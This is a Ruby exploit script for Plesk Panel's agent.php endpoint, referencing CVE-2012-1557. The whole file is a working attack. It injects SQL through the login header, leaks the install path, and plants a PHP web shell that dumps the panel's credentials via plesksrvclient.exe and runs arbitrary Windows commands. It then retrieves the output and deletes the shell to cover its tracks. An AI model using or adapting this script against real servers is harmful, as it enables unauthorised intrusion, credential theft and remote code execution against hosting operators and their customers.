#!/bin/env ruby
#encoding: utf-8

require 'net/http'
require 'net/https'
require 'uri'

#Reference: http://www.esecforte.com/blog/exploring-plesks-unspecified-vulnerability/
#Reference: CVE-2012-1557

host = ""
port = "8443"
ssl = true

randomNum = Random.new.rand(1_000_0..10_000_0-1) 
outputFileName = "shllspider".to_s+(randomNum.to_i).to_s+".php"

hostandport = host+":"+port

stage1 = "';exec a..a--"
#puts stage2
if ssl==true
	url = URI.parse('https://'+hostandport+'/enterprise/control/agent.php ')
else
	url = URI.parse('http://'+hostandport+'/enterprise/control/agent.php ')
end

http = Net::HTTP.new(url.host, url.port)
http.use_ssl = true
http.verify_mode = OpenSSL::SSL::VERIFY_NONE
data = '<?xml version="1.0" encoding="UTF-8" ?><packet version="1.5.0.0"><ip><get/></ip></packet>'

headers = {
  'HTTP_AUTH_LOGIN' => stage1,
  'HTTP_AUTH_PASSWD' => "spiderlabs",
  'Host' => hostandport,
  'Content-Type' => 'text/xml'
}

resp = http.post(url.path, data, headers)
results = resp.body

if results.include? "Login is incorrect" 
	puts "[*] Plesk panel is not vulnerable"
	exit
end
results = results.match(/in &lt;b&gt;(.*)plib/m)[1]
localPath = results
puts "[*] Local path of Plesk installation: "+localPath




puts "[*] Extracting Plesk Panel credentials"
stage5 = "';DECLARE @li_file_sytem_object INT; DECLARE @li_result INT;DECLARE @li_file_id INT;EXECUTE @li_result = sp_OACreate 'Scripting.FileSystemObject', @li_file_sytem_object OUT;EXECUTE @li_result = sp_OAMethod @li_file_sytem_object, 'OpenTextFile', @li_file_id OUT,'"+localPath+"htdocs\\enterprise\\control\\"+outputFileName+"', 8, 1; EXECUTE @li_result = sp_OAMethod @li_file_id, 'WriteLine', NULL, '<?php $a=exec(\"..\\..\\..\\bin\\plesksrvclient.exe -get -nogui\");echo $a;?>';---"

url5 = URI.parse('https://'+hostandport+'/enterprise/control/agent.php ')
http5 = Net::HTTP.new(url5.host, url5.port)
http5.use_ssl = true
http5.verify_mode = OpenSSL::SSL::VERIFY_NONE
data5 = '<?xml version="1.0" encoding="UTF-8" ?><packet version="1.5.0.0"><ip><get/></ip></packet>'

headers5 = {
  'Cookie' => 'PLESKSESSID=da4c205a20e18edc9ea9bc692cf65631',
  'HTTP_AUTH_LOGIN' => stage5,
  'HTTP_AUTH_PASSWD' => "spiderlabs",
  'Host' => hostandport,
  'Content-Type' => 'text/xml'
}
resp5 = http5.post(url5.path, data5, headers5)
results5 = resp5.body




puts "[*] Run command on remote server"
stage2 = "';DECLARE @li_file_sytem_object INT; DECLARE @li_result INT;DECLARE @li_file_id INT;EXECUTE @li_result = sp_OACreate 'Scripting.FileSystemObject', @li_file_sytem_object OUT;EXECUTE @li_result = sp_OAMethod @li_file_sytem_object, 'OpenTextFile', @li_file_id OUT,'"+localPath+"htdocs\\enterprise\\control\\"+outputFileName+"', 8, 1; EXECUTE @li_result = sp_OAMethod @li_file_id, 'WriteLine', NULL, '                   ';---"

url3 = URI.parse('https://'+hostandport+'/enterprise/control/agent.php ')
http3 = Net::HTTP.new(url3.host, url3.port)
http3.use_ssl = true
http3.verify_mode = OpenSSL::SSL::VERIFY_NONE
data3 = '<?xml version="1.0" encoding="UTF-8" ?><packet version="1.5.0.0"><ip><get/></ip></packet>'

headers3 = {
  'HTTP_AUTH_LOGIN' => stage2,
  'HTTP_AUTH_PASSWD' => "spiderlabs",
  'Host' => hostandport,
  'Content-Type' => 'text/xml'
}
resp3 = http3.post(url3.path, data3, headers3)
results3 = resp3.body


windowsCmd = "ver"
stage2 = "';DECLARE @li_file_sytem_object INT; DECLARE @li_result INT;DECLARE @li_file_id INT;EXECUTE @li_result = sp_OACreate 'Scripting.FileSystemObject', @li_file_sytem_object OUT;EXECUTE @li_result = sp_OAMethod @li_file_sytem_object, 'OpenTextFile', @li_file_id OUT,'"+localPath+"htdocs\\enterprise\\control\\"+outputFileName+"', 8, 1; EXECUTE @li_result = sp_OAMethod @li_file_id, 'WriteLine', NULL, '<?php $a=exec(\""+windowsCmd+"\");echo $a;?>';---"

url3 = URI.parse('https://'+hostandport+'/enterprise/control/agent.php ')
http3 = Net::HTTP.new(url3.host, url3.port)
http3.use_ssl = true
http3.verify_mode = OpenSSL::SSL::VERIFY_NONE
data3 = '<?xml version="1.0" encoding="UTF-8" ?><packet version="1.5.0.0"><ip><get/></ip></packet>'

headers3 = {
  'HTTP_AUTH_LOGIN' => stage2,
  'HTTP_AUTH_PASSWD' => "spiderlabs",
  'Host' => hostandport,
  'Content-Type' => 'text/xml'
}
resp3 = http3.post(url3.path, data3, headers3)
results3 = resp3.body

newUrl = "https://"+hostandport+"/enterprise/control/"+outputFileName
print "[*] Write output to "+newUrl+"\n\n"
url2 = URI.parse("https://"+hostandport+"/enterprise/control/"+outputFileName)
http2 = Net::HTTP.new(url2.host, url2.port)
http2.use_ssl = true
http2.verify_mode = OpenSSL::SSL::VERIFY_NONE
data = ''
resp = http2.put(url2.path,data)
puts resp.body






puts "\n[*] Cleaning up and deleting file..."
stage4 = "';DECLARE @Result int;DECLARE @FSO_Token int;EXEC @Result = sp_OACreate 'Scripting.FileSystemObject', @FSO_Token OUTPUT;EXEC @Result = sp_OAMethod @FSO_Token, 'DeleteFile', NULL, '"+localPath+"htdocs\\enterprise\\control\\"+outputFileName+"';EXEC @Result = sp_OADestroy @FSO_Token;---"

url4 = URI.parse('https://'+hostandport+'/enterprise/control/agent.php ')
http4 = Net::HTTP.new(url4.host, url4.port)
http4.use_ssl = true
http4.verify_mode = OpenSSL::SSL::VERIFY_NONE
data4 = '<?xml version="1.0" encoding="UTF-8" ?><packet version="1.5.0.0"><ip><get/></ip></packet>'

headers4 = {
  'HTTP_AUTH_LOGIN' => stage4,
  'HTTP_AUTH_PASSWD' => "spiderlabs",
  'Host' => hostandport,
  'Content-Type' => 'text/xml'
}
resp4 = http4.post(url4.path, data4, headers4)
results4 = resp4.body
